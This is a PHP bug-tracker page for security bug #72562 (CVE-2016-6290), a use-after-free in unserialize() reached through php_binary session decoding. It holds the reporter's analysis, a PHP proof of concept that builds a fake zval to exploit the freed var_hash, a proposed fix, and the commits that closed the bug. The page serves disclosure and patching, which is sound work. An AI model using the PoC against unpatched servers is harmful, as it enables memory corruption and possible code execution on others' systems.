@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='Session related Bug #72562 - RDF' href='rss/bug.php?id=72562'>
+        <link rel='alternate' type='application/rss+xml' title='Session related Bug #72562 - RSS 2.0' href='rss/bug.php?id=72562&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #72562 :: Use After Free in unserialize() with Unexpected Session Deserialization</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=72562">Sec Bug</a>&nbsp;#72562</th>
+            <td id="summary" colspan="5">Use After Free in unserialize() with Unexpected Session Deserialization</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-07-08 02:50 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-07-25 15:18 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=Session+related">Session related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.5.37</td>
+            <th class="details">OS:</th>
+            <td></td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6290" target="_blank">2016-6290</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=72562&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=72562&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=72562&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1467946204">&nbsp;</a><strong>[2016-07-08 02:50 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+Use After Free in unserialize() with Unexpected Session Deserialization
+
+```
+PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */
+{
+	...
+	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+
+	for (p = val; p &lt; endptr; ) {
+		zval **tmp;
+		namelen = ((unsigned char)(*p)) &amp; (~PS_BIN_UNDEF);
+
+		if (namelen &lt; 0 || namelen &gt; PS_BIN_MAX || (p + namelen) &gt;= endptr) {
+			return FAILURE;
+		}
+```
+
+The `PHP_VAR_UNSERIALIZE_DESTROY` will not be called when the deserialization fails.
+
+```
+#define PHP_VAR_UNSERIALIZE_DESTROY(var_hash_ptr) \
+do { \
+	/* fprintf(stderr, &quot;UNSERIALIZE_DESTROY == lock: %u, level: %u\n&quot;, BG(serialize_lock), BG(unserialize).level); */ \
+	if (BG(serialize_lock) || !BG(unserialize).level) { \
+		var_destroy(&amp;(var_hash_ptr)); \
+		efree(var_hash_ptr); \
+	} else { \
+		if (!--BG(unserialize).level) { \
+			var_destroy(&amp;(var_hash_ptr)); \
+			efree((var_hash_ptr)); \
+			BG(unserialize).var_hash = NULL; \
+		} \
+	} \
+} while (0)
+```
+
+So the `var_hash` will not be destroyed, this means that it is possible to call the php_var_unserialize() multiple times with the `var_hash`. This also means that it is possible to lead to use-after-free in the context of code. The exploitation way has been demonstrated many times before in some fixed and unfixed bugs.
+
+PoC:
+```
+&lt;?php
+
+ini_set('session.serialize_handler', 'php_binary');
+session_start();
+$sess = &quot;\x1xi:1;\x2y&quot;;
+session_decode($sess);
+$uns_1 = '{';
+$out_1[] = unserialize($uns_1);
+unset($out_1);
+$fakezval = ptr2str(1122334455);
+$fakezval .= ptr2str(0);
+$fakezval .= &quot;\x00\x00\x00\x00&quot;;
+$fakezval .= &quot;\x01&quot;;
+$fakezval .= &quot;\x00&quot;;
+$fakezval .= &quot;\x00\x00&quot;;
+for ($i = 0; $i &lt; 5; $i++) {
+  $v[$i] = $fakezval.$i;
+}
+$uns_2 = 'R:2;';
+$out_2 = unserialize($uns_2);
+var_dump($out_2);
+
+function ptr2str($ptr)
+{
+	$out = '';
+	for ($i = 0; $i &lt; 8; $i++) {
+		$out .= chr($ptr &amp; 0xff);
+		$ptr &gt;&gt;= 8;
+	}
+	return $out;
+}
+
+?&gt;
+```
+
+Fix:
+```
+if (namelen &lt; 0 || namelen &gt; PS_BIN_MAX || (p + namelen) &gt;= endptr) {
++  PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+  return FAILURE;
+}
+```
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=72562'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=72562'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1468391352">&nbsp;</a><strong>[2016-07-13 06:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1468391352">&nbsp;</a><strong>[2016-07-13 06:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Fix added in security repo as 3798eb6fd5dddb211b01d41495072fd9858d4e32
+</pre>
+</div><div class='comment type_svn' ><a name="1468914453">&nbsp;</a><strong>[2016-07-19 07:47 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32</a>
+Log: Fix <a href='bug.php?id=72562'>bug #72562</a> - destroy var_hash properly
+</pre>
+</div><div class='comment type_log' ><a name="1468914453">&nbsp;</a><strong>[2016-07-19 07:47 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1468914814">&nbsp;</a><strong>[2016-07-19 07:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32</a>
+Log: Fix <a href='bug.php?id=72562'>bug #72562</a> - destroy var_hash properly
+</pre>
+</div><div class='comment type_svn' ><a name="1468917591">&nbsp;</a><strong>[2016-07-19 08:39 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32</a>
+Log: Fix <a href='bug.php?id=72562'>bug #72562</a> - destroy var_hash properly
+</pre>
+</div><div class='comment type_svn' ><a name="1468918542">&nbsp;</a><strong>[2016-07-19 08:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32</a>
+Log: Fix <a href='bug.php?id=72562'>bug #72562</a> - destroy var_hash properly
+</pre>
+</div><div class='comment type_log' ><a name="1469459884">&nbsp;</a><strong>[2016-07-25 15:18 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2016-6290</span>
+</div></div></div><div class='comment type_svn' ><a name="1476699076">&nbsp;</a><strong>[2016-10-17 10:11 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3798eb6fd5dddb211b01d41495072fd9858d4e32</a>
+Log: Fix <a href='bug.php?id=72562'>bug #72562</a> - destroy var_hash properly
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
